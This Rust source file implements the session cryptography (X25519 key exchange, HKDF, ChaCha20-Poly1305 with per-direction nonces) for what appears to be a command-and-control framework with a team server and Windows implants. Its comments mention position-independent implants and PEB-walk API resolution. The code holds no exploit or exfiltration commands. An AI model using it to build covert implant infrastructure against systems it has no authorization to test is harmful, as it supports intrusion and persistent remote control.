//! Per-session cryptography: X25519 ECDH key agreement, HKDF, ChaCha20-Poly1305 AEAD.

use alloc::vec::Vec;
use chacha20poly1305::{
    aead::{Aead, Payload},
    ChaCha20Poly1305, KeyInit, Nonce,
};
use hkdf::Hkdf;
use rand_core::RngCore;
use sha2::Sha256;
use x25519_dalek::{PublicKey, StaticSecret};
use zeroize::Zeroize;

pub const PUBKEY_LEN: usize = 32;
pub const KEY_LEN: usize = 32;
pub const NONCE_LEN: usize = 12;

/// A 32-byte symmetric key derived per session via ECDH + HKDF.
///
/// The wrapper exists so we can give the key a real `Drop` (which zeroizes the
/// bytes) and a redacted `Debug` (so a stray `{:?}` / `tracing` log can't dump
/// it). It deliberately does **not** derive `Copy`: a `Copy` type is forbidden
/// from implementing `Drop` (E0184), and the prior code derived `Copy` *plus* a
/// bare `ZeroizeOnDrop` marker with no `Drop` — i.e. the marker's promise was
/// structurally unsatisfiable and the key was never actually cleared. Removing
/// `Copy` lets the real destructor below run and prevents implicit duplication
/// that would leave extra residual copies in freed memory.
///
/// Callers pass `&SessionKey` to `seal_dir`/`open_dir`; construction is a move,
/// so dropping the `Copy` bound does not break existing call sites.
pub struct SessionKey([u8; KEY_LEN]);

impl SessionKey {
    pub fn new(inner: [u8; KEY_LEN]) -> Self {
        Self(inner)
    }
    pub fn as_bytes(&self) -> &[u8; KEY_LEN] {
        &self.0
    }
}

impl Clone for SessionKey {
    fn clone(&self) -> Self {
        Self(self.0)
    }
}

impl PartialEq for SessionKey {
    fn eq(&self, other: &Self) -> bool {
        // Equality on session keys is only used in tests, never in a path that
        // gates secrets, so a direct compare is acceptable.
        self.0.as_slice() == other.0.as_slice()
    }
}
impl Eq for SessionKey {}

impl core::hash::Hash for SessionKey {
    fn hash<H: core::hash::Hasher>(&self, state: &mut H) {
        self.0.hash(state);
    }
}

impl core::fmt::Debug for SessionKey {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        // NEVER expose raw key bytes through {:?} / tracing / dbg!.
        f.write_str("SessionKey(<redacted>)")
    }
}

impl Zeroize for SessionKey {
    fn zeroize(&mut self) {
        self.0.zeroize();
    }
}

impl Drop for SessionKey {
    fn drop(&mut self) {
        self.0.zeroize();
        core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);
    }
}

/// Fill 32 bytes from the OS CSPRNG.
///
/// **std build** (server/agent-dev/client): uses `rand_core::OsRng` → `getrandom`
/// → `RtlGenRandom` via normal static linking. Works because these are regular
/// std binaries with a normal import table.
///
/// **no_std build** (PIC implant cdylib): `getrandom`'s `#[link(name="advapi32")]`
/// produces a static import-table entry that the PIC cdylib loader can't resolve
/// → `SystemFunction036` call aborts (`0xC0000409`). So the no_std build uses a
/// **registered CSPRNG callback**: the implant calls [`register_csprng`] during
/// bootstrap with a PEB-walk resolver that dynamically finds `SystemFunction036`
/// (a.k.a. `RtlGenRandom`) in `advapi32.dll` — no static linking, works on every
/// Windows version from XP SP2 through 11 25H2 (SystemFunction036 is the documented
/// stable entry point for the kernel CSPRNG). If no callback is registered,
/// `random_bytes` falls back to `OsRng` (which works on std targets).
/// Fill 32 bytes from the OS CSPRNG.
///
/// **std build** (server/agent-dev/client): uses `rand_core::OsRng` → `getrandom`.
/// `OsRng::fill_bytes` is documented infallible on supported targets, so the std
/// variant stays infallible (it panics only on truly unsupported platforms,
/// which fail to compile-link anyway).
///
/// **no_std build** (PIC implant): uses a registered CSPRNG callback
/// ([`register_csprng`]). Unlike `OsRng`, the hook CAN fail at runtime (export
/// not resolvable, `RtlGenRandom` returns 0), so the no_std variant returns
/// `Result` and the caller MUST act on failure — proceeding with the zeroed
/// buffer would build an all-zero X25519 scalar → identity-point ECDH → a
/// deterministic, decryptable, cross-implant-identical session key. That was the
/// pre-fix bug: the hook's `bool` return was discarded.
#[cfg(feature = "std")]
fn random_bytes(out: &mut [u8; 32]) {
    rand_core::OsRng.fill_bytes(out);
}

/// Error returned when CSPRNG fill fails or yields an invalid (all-zero) scalar.
/// In the no_std implant this is fatal: the caller writes a diag marker and
/// aborts rather than constructing predictable key material.
#[derive(Debug)]
#[cfg(not(feature = "std"))]
pub enum CryptoError {
    /// The registered CSPRNG hook returned `false` (fill failed).
    CsprngFailed,
    /// The CSPRNG produced an all-zero scalar — never a legitimate key. Treated
    /// as a failure even if the hook reported success (defense in depth: a
    /// broken/hooked RNG that returns `true` with a zero buffer is caught).
    ZeroScalar,
}

/// Registered CSPRNG callback for the no_std PIC implant.
#[cfg(not(feature = "std"))]
static CSPRNG_HOOK: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Register a CSPRNG fill function for the no_std build.
///
/// **Safety**: `fill` must be safe to call from any thread (the CSPRNG is
/// stateless / thread-safe on Windows). The pointer is stored in an atomic and
/// never freed — it must point to a function that lives for the process lifetime.
#[cfg(not(feature = "std"))]
pub fn register_csprng(fill: fn(&mut [u8]) -> bool) -> Result<(), ()> {
    CSPRNG_HOOK
        .compare_exchange(
            0,
            fill as usize,
            core::sync::atomic::Ordering::Release,
            core::sync::atomic::Ordering::Relaxed,
        )
        .map(|_| ())
        .map_err(|_| ())
}

/// Fill 32 random bytes in the no_std build. Returns `Err` if the registered
/// CSPRNG hook reports failure; the buffer is left zeroed in that case (and the
/// caller MUST NOT use it — an all-zero scalar is rejected by [`reject_zero`]
/// even if reached by another path).
#[cfg(not(feature = "std"))]
fn random_bytes(out: &mut [u8; 32]) -> Result<(), CryptoError> {
    let hook = CSPRNG_HOOK.load(core::sync::atomic::Ordering::Acquire);
    if hook != 0 {
        // SAFETY: stored by register_csprng; process-lifetime fn pointer.
        let f: fn(&mut [u8]) -> bool = unsafe { core::mem::transmute(hook) };
        // KEY FIX: act on the bool. Discarding it (the pre-fix bug) left `out`
        // zeroed on hook failure → all-zero scalar → total crypto breakdown.
        if !f(out) {
            return Err(CryptoError::CsprngFailed);
        }
        Ok(())
    } else {
        // Fallback: OsRng. On a no_std PIC cdylib without a registered hook this
        // may abort at link/runtime; but if it returns it filled the buffer.
        rand_core::OsRng.fill_bytes(out);
        Ok(())
    }
}

/// Reject an all-zero scalar. An all-zero X25519 private key clamps to an
/// effective zero scalar whose public key is the curve identity point — every
/// such implant derives the same (all-zero) shared secret. Never legitimate.
fn reject_zero(bytes: &[u8; 32]) -> Result<(), ZeroScalarMarker> {
    if bytes.iter().all(|&b| b == 0) {
        Err(ZeroScalarMarker)
    } else {
        Ok(())
    }
}

/// Marker type for [`reject_zero`]'s failure (kept out of the public `CryptoError`
/// enum so the std build, which never hits it, doesn't need the enum).
struct ZeroScalarMarker;

/// Error from [`ServerKeypair::generate`] / [`ImplantKeypair::generate`].
///
/// This is returned (not panicked) so the no_std implant can surface a clean
/// diagnostic and abort rather than constructing predictable key material.
/// Under the std build the CSPRNG is infallible, so this is only ever `Ok`.
#[derive(Debug)]
pub enum GenerateError {
    /// The no_std CSPRNG hook returned `false`.
    #[cfg(not(feature = "std"))]
    CsprngFailed,
    /// The RNG returned success but produced an all-zero scalar (identity point).
    /// Defense in depth: a hooked/broken RNG that lies with `true` is still caught.
    ZeroScalar,
}

/// Fill 32 random bytes and reject the all-zero result. Bridges the std
/// (infallible `OsRng`) and no_std (fallible hook) `random_bytes` into one
/// `Result`-returning helper used by both keypair generators.
fn fill_random_checked(out: &mut [u8; 32]) -> Result<(), GenerateError> {
    #[cfg(feature = "std")]
    {
        random_bytes(out);
    }
    #[cfg(not(feature = "std"))]
    {
        random_bytes(out).map_err(|_| GenerateError::CsprngFailed)?;
    }
    reject_zero(out).map_err(|_| GenerateError::ZeroScalar)
}

/// Error from [`ServerKeypair::derive_for`] / [`ImplantKeypair::session_key`].
///
/// Surfaced (not panicked) because both the server (`panic = "abort"`) and the
/// no_std implant need a clean recovery path: the server fails the check-in
/// with an error response, the implant treats it as a fatal config error.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeyExchangeError {
    /// The peer's public key is a low-order point (e.g. the curve identity
    /// point), so X25519 ECDH yields an all-zero shared secret. RFC 7748 §6.1
    /// requires rejecting such keys: accepting them would let an attacker
    /// force a deterministic, decryptable session key shared by every implant
    /// that presents the same pubkey (contributory behavior violation).
    NonContributory,
    /// HKDF expand failed (output length over the RFC 5869 §2.3 expand bound).
    /// Only reachable if a future change grows the derived key beyond
    /// `255 × 32` bytes; today the output is a compile-time 32 bytes.
    Hkdf(HkdfError),
}

impl core::fmt::Display for KeyExchangeError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            KeyExchangeError::NonContributory => f.write_str(
                "key exchange rejected: peer public key is a low-order point \
                 (identity point / all-zero shared secret)",
            ),
            KeyExchangeError::Hkdf(e) => write!(f, "key exchange failed: {e}"),
        }
    }
}

#[cfg(feature = "std")]
impl std::error::Error for KeyExchangeError {}

impl From<HkdfError> for KeyExchangeError {
    fn from(e: HkdfError) -> Self {
        KeyExchangeError::Hkdf(e)
    }
}

/// The team server's long-term identity keypair. The public half is baked
/// into every implant's config; the secret never leaves the server.
#[derive(Clone)]
pub struct ServerKeypair {
    secret: StaticSecret,
    public: PublicKey,
}

impl ServerKeypair {
    /// Generate a fresh keypair from the OS CSPRNG.
    ///
    /// Returns `Err` only when the CSPRNG fails (no_std hook reports failure,
    /// or — defense in depth — the fill yields an all-zero scalar, which would
    /// produce the curve identity point). In the std build `OsRng` is
    /// infallible, so the `Err` arm is unreachable in practice but kept for a
    /// uniform call-site signature.
    pub fn generate() -> Result<Self, GenerateError> {
        let mut bytes = [0u8; 32];
        fill_random_checked(&mut bytes)?;
        let secret = StaticSecret::from(bytes);
        bytes.zeroize();
        let public = PublicKey::from(&secret);
        Ok(Self { secret, public })
    }

    pub fn public_bytes(&self) -> [u8; PUBKEY_LEN] {
        self.public.to_bytes()
    }

    /// Serialize the long-term secret so the server identity can persist across
    /// restarts (`NYX_KEYFILE`). The secret never leaves the server.
    pub fn to_secret_bytes(&self) -> [u8; KEY_LEN] {
        self.secret.to_bytes()
    }

    /// Reconstruct the identity from a persisted secret (e.g. read from
    /// `NYX_KEYFILE`). Derives the matching public key.
    pub fn from_secret_bytes(mut bytes: [u8; KEY_LEN]) -> Self {
        let secret = StaticSecret::from(bytes);
        bytes.zeroize();
        let public = PublicKey::from(&secret);
        Self { secret, public }
    }

    /// Derive the AEAD session key for a connecting implant whose ephemeral
    /// public key is `implant_pub`. Both sides compute this and must agree.
    ///
    /// Returns [`KeyExchangeError::NonContributory`] when the implant's public
    /// key is a low-order point (the ECDH shared secret is all zeros) — the
    /// server must fail the check-in rather than derive a deterministic,
    /// attacker-forced session key.
    pub fn derive_for(
        &self,
        implant_pub: &[u8; PUBKEY_LEN],
    ) -> Result<SessionKey, KeyExchangeError> {
        let their = PublicKey::from(*implant_pub);
        let shared = self.secret.diffie_hellman(&their);
        let mut shared_bytes = shared.to_bytes();
        // RFC 7748 §6.1 contributory behavior: an all-zero shared secret means
        // the peer's public key is a low-order point. Reject it — accepting it
        // would let an attacker force a session key identical across every
        // implant presenting the same pubkey (see [`KeyExchangeError`]).
        if shared_bytes.iter().all(|&b| b == 0) {
            return Err(KeyExchangeError::NonContributory);
        }
        let key = derive_session_key(&shared_bytes, &self.public.to_bytes(), implant_pub)
            .map_err(KeyExchangeError::from)?;
        shared_bytes.zeroize();
        Ok(key)
    }
}

impl Drop for ServerKeypair {
    fn drop(&mut self) {
        self.secret.zeroize();
        core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);
    }
}

/// An implant's per-run keypair.
pub struct ImplantKeypair {
    secret: StaticSecret,
    public: PublicKey,
}

impl ImplantKeypair {
    /// Generate a fresh keypair from the OS CSPRNG.
    ///
    /// Returns `Err` only when the CSPRNG fails or yields an all-zero scalar
    /// (which would produce the curve identity point and a deterministic shared
    /// secret shared with every other affected implant). In the std build
    /// `OsRng` is infallible so the `Err` arm is unreachable in practice.
    pub fn generate() -> Result<Self, GenerateError> {
        let mut bytes = [0u8; 32];
        fill_random_checked(&mut bytes)?;
        let secret = StaticSecret::from(bytes);
        bytes.zeroize();
        let public = PublicKey::from(&secret);
        Ok(Self { secret, public })
    }

    /// Reconstruct an implant keypair from a raw 32-byte secret (e.g. from
    /// a per-implant config baked at generation time).
    pub fn from_secret_bytes(mut bytes: [u8; KEY_LEN]) -> Self {
        let secret = StaticSecret::from(bytes);
        bytes.zeroize();
        let public = PublicKey::from(&secret);
        Self { secret, public }
    }

    pub fn public_bytes(&self) -> [u8; PUBKEY_LEN] {
        self.public.to_bytes()
    }

    /// Derive the session key given the server's known public key.
    ///
    /// Returns [`KeyExchangeError::NonContributory`] when the configured
    /// server public key is a low-order point (all-zero shared secret) — a
    /// fatal config error: the implant must not proceed with a deterministic,
    /// attacker-forced session key.
    pub fn session_key(
        &self,
        server_pub: &[u8; PUBKEY_LEN],
    ) -> Result<SessionKey, KeyExchangeError> {
        let server = PublicKey::from(*server_pub);
        let shared = self.secret.diffie_hellman(&server);
        let mut shared_bytes = shared.to_bytes();
        // RFC 7748 §6.1 contributory behavior: reject an all-zero shared
        // secret (the configured server pubkey is a low-order point). See
        // [`KeyExchangeError`].
        if shared_bytes.iter().all(|&b| b == 0) {
            return Err(KeyExchangeError::NonContributory);
        }
        let key = derive_session_key(&shared_bytes, server_pub, &self.public.to_bytes())
            .map_err(KeyExchangeError::from)?;
        shared_bytes.zeroize();
        Ok(key)
    }
}

impl Drop for ImplantKeypair {
    fn drop(&mut self) {
        self.secret.zeroize();
        core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);
    }
}

/// HKDF-SHA256 over the shared secret, bound to both public keys so the
/// resulting key is unique per (implant, server) pair.
///
/// Returns [`HkdfError::OutputTooLong`] if the requested output length exceeds
/// the RFC 5869 §2.3 expand bound — impossible here because `okm` is a
/// compile-time `KEY_LEN` (32) byte array, far below `255 × 32`. The failure
/// is surfaced as a `Result` rather than panicking because the implant builds
/// with `panic = "abort"` (a panic would tear the process down with no
/// recovery path).
pub fn derive_session_key(
    shared: &[u8; 32],
    server_pub: &[u8; PUBKEY_LEN],
    implant_pub: &[u8; PUBKEY_LEN],
) -> Result<SessionKey, HkdfError> {
    // P1-2 fix: use server_pub as the HKDF-Extract salt (RFC 5869 §3.1
    // recommends a non-empty salt; the server's long-term public key is public,
    // fixed, and non-attacker-controlled — an ideal salt per Trail of Bits
    // guidance). Previously `None` (a string of HashLen zeros), so extract-stage
    // domain separation depended solely on `info`. The pubkeys also go into
    // `info` for expand-stage binding, layering separation at both stages.
    let hk = Hkdf::<Sha256>::new(Some(server_pub), shared);
    // Stack-allocated info buffer: "nyx-session-v1" (14) + server_pub (32) +
    // implant_pub (32) = 78 bytes. Avoids a heap allocation for this small,
    // fixed-size payload.
    let mut info = [0u8; 80];
    let label = b"nyx-session-v1";
    info[..label.len()].copy_from_slice(label);
    let mut pos = label.len();
    info[pos..pos + PUBKEY_LEN].copy_from_slice(server_pub);
    pos += PUBKEY_LEN;
    info[pos..pos + PUBKEY_LEN].copy_from_slice(implant_pub);
    pos += PUBKEY_LEN;
    let mut okm = [0u8; KEY_LEN];
    // HKDF expand fails only when the requested length exceeds 255 * HashLen
    // (RFC 5869 §2.3); 32 bytes is far below the 8160-byte cap, so the Err arm
    // is unreachable — but handle it as a Result, not a panic (`panic = "abort"`
    // builds need a recovery path).
    hk.expand(&info[..pos], &mut okm)
        .map_err(|_| HkdfError::OutputTooLong)?;
    let key = SessionKey::new(okm);
    okm.zeroize();
    Ok(key)
}

/// Which direction a frame travels. The session key is shared by both peers,
/// so the two directions **must** use disjoint nonce spaces — otherwise an
/// implant check-in sealed at counter=0 collides with the server reply sealed
/// at send_counter=0 (identical key, nonce, and AAD = the implant pubkey),
/// which is a catastrophic ChaCha20-Poly1305 nonce reuse.
///
/// We separate the spaces by setting a fixed direction discriminator in the
/// top byte of the 96-bit nonce (`nonce[0]`). The counter still occupies
/// `nonce[4..12]`; bytes `[1..4]` stay zero. `ClientToServer` leaves the
/// discriminator at 0 (preserving the historical implant→server nonce); the
/// server→implant direction flips bit 0 of the top byte.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Direction {
    /// Implant → server (beacon check-ins + task responses).
    ClientToServer,
    /// Server → implant (queued-task batches).
    ServerToClient,
}

impl Direction {
    /// The discriminator written into `nonce[0]` to keep the two directions'
    /// nonce spaces disjoint for every counter value.
    const fn discriminator(self) -> u8 {
        match self {
            Direction::ClientToServer => 0x00,
            Direction::ServerToClient => 0x01,
        }
    }
}

/// Build the 96-bit nonce for a given direction + counter.
fn nonce_for(dir: Direction, counter: u64) -> [u8; NONCE_LEN] {
    let mut nonce_bytes = [0u8; NONCE_LEN];
    nonce_bytes[0] = dir.discriminator();
    nonce_bytes[4..12].copy_from_slice(&counter.to_le_bytes());
    nonce_bytes
}

/// AEAD-encrypt `plaintext` under `key` with a direction- and counter-derived
/// nonce. `aad` is authenticated but not encrypted (we bind the session pubkey).
///
/// Returns `Err` only on allocator failure (the underlying AEAD encrypt is
/// otherwise infallible). Pre-fix this used `.expect()`; under `panic="abort"`
/// (used by the implant) an OOM would have torn the process down without any
/// diagnostic, so we now surface it as a `Result` and let the caller decide
/// whether to retry, drop the frame, or terminate.
pub fn seal_dir(
    key: &SessionKey,
    dir: Direction,
    counter: u64,
    aad: &[u8],
    plaintext: &[u8],
) -> Result<Vec<u8>, chacha20poly1305::Error> {
    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key.as_bytes()));
    let nonce_bytes = nonce_for(dir, counter);
    let nonce = Nonce::from_slice(&nonce_bytes);
    cipher.encrypt(
        nonce,
        Payload {
            msg: plaintext,
            aad,
        },
    )
}

/// AEAD-decrypt `ciphertext`. Returns `Err` on tag mismatch (tampering / wrong
/// key / wrong direction / wrong counter).
pub fn open_dir(
    key: &SessionKey,
    dir: Direction,
    counter: u64,
    aad: &[u8],
    ciphertext: &[u8],
) -> Result<Vec<u8>, chacha20poly1305::Error> {
    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key.as_bytes()));
    let nonce_bytes = nonce_for(dir, counter);
    let nonce = Nonce::from_slice(&nonce_bytes);
    cipher.decrypt(
        nonce,
        Payload {
            msg: ciphertext,
            aad,
        },
    )
}

/// Back-compat shim: seals with [`Direction::ClientToServer`]. Prefer
/// [`seal_dir`] for new call sites so the direction is explicit. See
/// [`seal_dir`] for the error semantics.
#[deprecated(
    note = "hardcodes Direction::ClientToServer; use seal_dir with an explicit direction instead"
)]
pub fn seal(
    key: &SessionKey,
    counter: u64,
    aad: &[u8],
    plaintext: &[u8],
) -> Result<Vec<u8>, chacha20poly1305::Error> {
    seal_dir(key, Direction::ClientToServer, counter, aad, plaintext)
}

/// Back-compat shim: opens with [`Direction::ClientToServer`]. Prefer
/// [`open_dir`] for new call sites so the direction is explicit.
#[deprecated(
    note = "hardcodes Direction::ClientToServer; use open_dir with an explicit direction instead"
)]
pub fn open(
    key: &SessionKey,
    counter: u64,
    aad: &[u8],
    ciphertext: &[u8],
) -> Result<Vec<u8>, chacha20poly1305::Error> {
    open_dir(key, Direction::ClientToServer, counter, aad, ciphertext)
}

// ── Per-implant config crypto helpers ──────────────────────────────────────
// These are used by the implant's config_placeholder.rs to derive the per-implant
// config decryption key and decrypt the runtime config blob. They operate on raw
// byte arrays (no SessionKey wrapper) because the config key is a separate key
// domain from session keys.

/// Derive the X25519 public key from a raw 32-byte secret.
///
/// **Why this is `Option` but always `Some`** (documented rather than changed
/// to a bare `[u8; 32]` so the signature stays symmetric with [`ecdh`]'s
/// failure mode): X25519 clamps the scalar inside the Montgomery ladder
/// (RFC 7748 §5), so `StaticSecret` accepts *any* 32-byte input — even the
/// all-zero array clamps to a valid scalar whose public key is a well-defined,
/// non-identity point. The low-order rejection that makes [`ecdh`] fallible
/// applies to a *peer's* public key read off the wire, never to a public key
/// derived from our own clamped scalar, so there is no input for which
/// derivation can fail. The `None` arm is unreachable; callers may `?` it
/// without a recovery path.
pub fn public_from_secret(secret: &[u8; 32]) -> Option<[u8; 32]> {
    let bytes: [u8; 32] = *secret;
    let scalar = x25519_dalek::StaticSecret::from(bytes);
    let pubkey = x25519_dalek::PublicKey::from(&scalar);
    Some(*pubkey.as_bytes())
}

/// Raw X25519 ECDH: compute `our_secret × their_public`. Returns the 32-byte
/// shared secret (the x-coordinate of the result point). Returns `None` if the
/// public key is a low-order point (zero-scalar guard).
pub fn ecdh(our_secret: &[u8; 32], their_public: &[u8; 32]) -> Option<[u8; 32]> {
    let scalar = x25519_dalek::StaticSecret::from(*our_secret);
    let pubkey = x25519_dalek::PublicKey::from(*their_public);
    // Zero-scalar check: if the scalar is all zeros, reject.
    if *our_secret == [0u8; 32] {
        return None;
    }
    let shared = scalar.diffie_hellman(&pubkey);
    let shared_bytes = shared.as_bytes();
    // RFC 7748 §6.1 contributory behavior: reject all-zero shared secret
    // (indicates the peer's public key is a low-order point).
    if shared_bytes.iter().all(|&b| b == 0) {
        return None;
    }
    Some(*shared_bytes)
}

/// Error returned by [`hkdf_sha256`] when the requested output length
/// violates the HKDF-Expand bound (RFC 5869 §2.3: `L ≤ 255 × HashLen`). SHA-256
/// has `HashLen = 32`, so any `okm.len() > 255 × 32 = 8160` is rejected.
///
/// Kept as a small hand-rolled enum (rather than re-exporting `hkdf::Error`)
/// so the `no_std` implant build does not pull the full `hkdf` error surface
/// through its public API.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HkdfError {
    /// `okm.len()` exceeds `255 × 32 = 8160` bytes (the RFC 5869 expand bound).
    OutputTooLong,
}

impl core::fmt::Display for HkdfError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            HkdfError::OutputTooLong => f.write_str(
                "hkdf_sha256: requested OKM length exceeds 255 * HashLen (8160 bytes for SHA-256)",
            ),
        }
    }
}

#[cfg(feature = "std")]
impl std::error::Error for HkdfError {}

/// HKDF-SHA256: extract-then-expand. `salt` and `info` are passed as-is (RFC
/// 5869). `okm` receives the output key material; its length determines the
/// HKDF output length. Returns `Err(HkdfError::OutputTooLong)` if
/// `okm.len() > 255 × 32` (the RFC 5869 §2.3 expand bound).
///
/// **Why this is a `Result`**: this function is `pub` and callable from the
/// implant, which builds with `panic = "abort"`. The pre-fix implementation
/// used `.expect("okm.len() <= 255*HashLen is a caller invariant")`, so any
/// caller that passed an oversized buffer killed the process with no recovery
/// path. Surfacing the error lets callers degrade gracefully (the server
/// returns 500; the implant writes a diagnostic exit code).
pub fn hkdf_sha256(ikm: &[u8], salt: &[u8], info: &[u8], okm: &mut [u8]) -> Result<(), HkdfError> {
    let hk = Hkdf::<Sha256>::new(Some(salt), ikm);
    hk.expand(info, okm).map_err(|_| {
        // `hkdf::Hkdf::expand` returns `Err(InvalidLength)` *only* when
        // `okm.len() > 255 * HashLen`; the `info` length is unbounded. So any
        // error here is the output-length invariant — map it to our single
        // variant.
        HkdfError::OutputTooLong
    })
}

/// ChaCha20-Poly1305 AEAD decrypt. `key` is the raw 32-byte key, `nonce` is
/// 12 bytes, `ct_with_tag` is ciphertext || 16-byte Poly1305 tag. AAD is empty
/// (the config blob is self-authenticating via the tag).
/// Returns `None` on tag mismatch.
pub fn aead_decrypt(key: &[u8; 32], nonce: &[u8; 12], ct_with_tag: &[u8]) -> Option<Vec<u8>> {
    use chacha20poly1305::aead::KeyInit;
    use chacha20poly1305::{ChaCha20Poly1305, Nonce};
    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
    let nonce = Nonce::from_slice(nonce);
    cipher.decrypt(nonce, ct_with_tag).ok()
}
